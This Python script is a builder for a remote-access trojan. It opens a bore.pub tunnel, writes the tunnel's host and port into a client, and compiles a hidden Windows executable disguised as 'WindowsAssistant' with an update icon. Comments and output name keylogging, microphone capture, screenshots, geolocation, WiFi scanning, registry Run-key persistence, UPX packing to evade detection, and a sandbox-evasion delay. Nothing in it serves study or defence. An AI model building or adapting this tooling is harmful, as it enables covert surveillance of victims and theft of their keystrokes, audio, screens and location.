import os
import sys
import subprocess
import re
import urllib.request
import zipfile
import time

def setup_bore():
    """Downloads and sets up bore tunneling tool"""
    url = "https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip"
    zip_path = "bore.zip"
    exe_path = "bore.exe"
    
    if not os.path.exists(exe_path):
        print("[*] Downloading Bore (A free Ngrok alternative without accounts)...")
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(".")
        os.remove(zip_path)
    return exe_path

def start_bore(exe_path):
    """Starts bore and extracts the public URL/Port"""
    print("[*] Starting TCP Tunnel...")
    # Start bore in the background
    proc = subprocess.Popen([exe_path, "local", "5000", "--to", "bore.pub"], 
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    server_ip = "bore.pub"
    server_port = None
    
    # Wait and read output to find the port
    for _ in range(20):
        line = proc.stdout.readline()
        if not line:
            break
        # Example output: INFO bore_cli::client: listening at bore.pub:45678
        if "listening at bore.pub:" in line:
            server_port = int(line.strip().split(":")[-1])
            break
            
    if not server_port:
        proc.kill()
        raise Exception("Failed to get a port from bore.pub")
        
    return proc, server_ip, server_port

def main():
    print("=== Ultimate Auto-Client Builder ===")
    print("This will completely automate tunneling and building the .exe without any accounts or passwords!\n")
    
    try:
        exe_path = setup_bore()
        bore_proc, server_ip, server_port = start_bore(exe_path)
    except Exception as e:
        print(f"[-] Error setting up tunnel: {e}")
        return
        
    print(f"\n[+] SUCCESS! Public Tunnel Established!")
    print(f"    Host: {server_ip}")
    print(f"    Port: {server_port}")
    
    # Now proceed to build the exe
    original_file = "client.py"
    temp_file = "client_build_temp.py"
    
    if not os.path.exists(original_file):
        print(f"\n[-] Error: {original_file} not found.")
        bore_proc.kill()
        return
        
    with open(original_file, "r", encoding="utf-8") as f:
        content = f.read()
        
    # Inject IP and PORT
    content = re.sub(r'SERVER_IP\s*=\s*["\'][^"\']*["\']', f'SERVER_IP = "{server_ip}"', content)
    content = re.sub(r'PORT\s*=\s*\d+', f'PORT = {server_port}', content)
    
    with open(temp_file, "w", encoding="utf-8") as f:
        f.write(content)
        
    print("\n[*] Checking PyInstaller...")
    try:
        import PyInstaller
    except ImportError:
        print("[*] Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "-q"])
    
    print("[*] Checking extra dependencies for build...")
    extra_pkgs = []
    for mod, pkg in [("pynput", "pynput"), ("sounddevice", "sounddevice"), ("PIL", "Pillow")]:
        try:
            __import__(mod)
        except ImportError:
            extra_pkgs.append(pkg)
    if extra_pkgs:
        print(f"[*] Installing: {', '.join(extra_pkgs)}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q"] + extra_pkgs)
        print("[+] Dependencies installed")
            
    print("\n[*] Building executable... Please wait (this takes about 30 seconds)...")
    
    exe_name = "WindowsAssistant"
    icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "update_icon.ico")
    upx_path  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "upx.exe")
    
    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--name", exe_name,
        # ── Icon ──────────────────────────────────────────────────────────────
        f"--icon={icon_path}",
        # ── UPX compression (smaller .exe, harder to detect) ─────────────────
    ]
    if os.path.exists(upx_path):
        pyinstaller_cmd.append(f"--upx-dir={os.path.dirname(upx_path)}")
    pyinstaller_cmd += [
        # ── Screenshot (Pillow) ─────────────────────────────────────────────
        "--hidden-import", "PIL",
        "--hidden-import", "PIL.ImageGrab",
        "--hidden-import", "PIL.Image",
        "--hidden-import", "PIL.ImageTk",
        "--hidden-import", "PIL.ImageFilter",
        "--hidden-import", "PIL.ImageEnhance",
        # ── Screenshot fallback (mss) ──────────────────────────────────────
        "--hidden-import", "mss",
        # ── Microphone (sounddevice + numpy) ────────────────────────────────
        "--hidden-import", "sounddevice",
        "--hidden-import", "_sounddevice_data",
        "--hidden-import", "numpy",
        # ── Keylog (pynput) ─────────────────────────────────────────────────
        "--hidden-import", "pynput",
        "--hidden-import", "pynput.keyboard",
        "--hidden-import", "pynput.keyboard._win32",
        "--hidden-import", "pynput.keyboard._xorg",
        "--hidden-import", "pynput.keyboard._darwin",
        "--hidden-import", "pynput.mouse",
        # ── Registry (winreg) ────────────────────────────────────────────────
        "--hidden-import", "winreg",
        # ── GeoLocation + BeaconDB (urllib / json / ctypes) ─────────────────
        "--hidden-import", "urllib",
        "--hidden-import", "urllib.request",
        "--hidden-import", "urllib.parse",
        "--hidden-import", "json",
        "--hidden-import", "ctypes",
        "--hidden-import", "ctypes.wintypes",
        # ── Privilege Inspector (winreg + subprocess already included) ────────
        "--hidden-import", "struct",
        # ── WiFi scan (subprocess + re already included) ──────────────────────
        "--hidden-import", "re",
        # ── GUI library (tkinter) ────────────────────────────────────────────
        "--hidden-import", "tkinter",
        "--hidden-import", "tkinter.messagebox",
        "--hidden-import", "tkinter.filedialog",
        # ── pynput — collect ALL platform backends ───────────────────────────
        "--hidden-import", "pynput.keyboard._win32",
        "--hidden-import", "pynput.mouse._win32",
        "--collect-all", "pynput",
        temp_file
    ]
    
    try:
        subprocess.check_call(pyinstaller_cmd, stdout=subprocess.DEVNULL)
        print("\n[+] ========================================= [+]")
        print("   SUCCESS! Executable successfully compiled!   ")
        print(f"   Name: {exe_name}.exe                         ")
        print("   Location: ./dist/                            ")
        print(f"   Icon: YES (update_icon.ico)                      ")
        print(f"   UPX: {'YES' if os.path.exists(upx_path) else 'NO'} compressed                           ")
        print(f"   Persistence: YES (HKCU Run on startup)        ")
        print(f"   Delay: YES (18s sandbox evasion)              ")
        print("[+] ========================================= [+]")
    except subprocess.CalledProcessError as e:
        print(f"\n[-] Build failed (error code: {e.returncode}).")
        try:
            bore_proc.kill()
        except Exception:
            pass
        return
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)
        if os.path.exists(f"{exe_name}.spec"):
            os.remove(f"{exe_name}.spec")
            
    print("\n[*] The TCP tunnel is currently ACTIVE.")
    print("[*] Keep this window open! If you close it, the tunnel will stop and the .exe won't be able to connect.")
    print("[*] Start your server (server.py) on port 5000 in a new terminal now!")
    print("[*] Press Ctrl+C here to stop the tunnel when you are done.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Closing tunnel...")
        bore_proc.kill()
        print("[+] Tunnel closed.")

if __name__ == "__main__":
    main()
